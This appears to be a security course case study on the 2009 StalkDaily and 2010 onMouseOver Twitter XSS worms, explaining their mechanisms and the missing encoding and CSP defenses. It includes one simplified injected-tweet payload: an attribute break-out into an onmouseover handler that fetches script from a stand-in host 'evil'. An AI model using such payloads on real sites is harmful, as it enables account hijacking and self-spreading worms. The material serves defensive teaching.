Module 16 · Case Study

Twitter Worms — StalkDaily (2009) & onMouseOver (2010)

Two stored-XSS worms that turned a real-time social feed into a propagation amplifier. The 2010 one needed nothing but a mouse passing over a tweet.

StalkDaily (April 2009)

A stored XSS in Twitter profile fields (URL/bio) let injected JavaScript run when others viewed a profile. Like Samy, it self-propagated: infected accounts posted tweets and updated their own profiles to spread the worm, advertising the "StalkDaily" site. Root cause: profile fields rendered without contextual output encoding.

onMouseOver (September 2010)

A more elegant and more viral bug. Twitter auto-linkified URLs in tweets, but a flaw in how it did so let an attacker break out of the link's href attribute and inject an onmouseover handler directly into the tweet's markup in the timeline.

<!-- simplified shape of the injected tweet -->
http://t.co/@"onmouseover="$.getScript('http://evil/x.js')"/  ...
<!-- rendered into the timeline as: -->
<a href="..." onmouseover="$.getScript(...)">...</a>
  • Mechanism 5 → 2: attribute-context break-out (Module 08) followed by an event handler (Module 05).
  • Zero click: onmouseover fires when the cursor merely passes over the tweet while scrolling the timeline — no interaction beyond reading.
  • Feed as amplifier: because tweets are shown to followers in real time, a single crafted tweet reached enormous audiences in minutes; many variants (rainbow-colored blocks, auto-retweeting) appeared within hours.

Mapping to the taxonomy

The absent defenses

  • Correct attribute-context encoding of the linkified URL — the single fix. The bug was a break-out from a quoted attribute; encoding the quote prevents the injected onmouseover from ever forming (Module 08).
  • A strict CSP (script-src without 'unsafe-inline') would have blocked the inline handler and the getScript fetch to a foreign host (script-src host allowlist).
  • Robust HTML construction (build DOM nodes / use a templating layer that encodes by context) rather than string concatenation of URLs into markup.

Lesson for defenders

The onMouseOver worm is the textbook argument that auto-firing event handlers + a broadcast surface = instant worm, and that a single missing attribute encoder is enough. It also shows why "we linkify user URLs" is a dangerous feature: it takes untrusted text and promotes it into markup, which is exactly where contextual encoding must be airtight. For your Module 18 work: any defense claiming to cover mechanism 2 must handle handlers introduced via attribute break-out, not just handlers in obviously-injected tags.
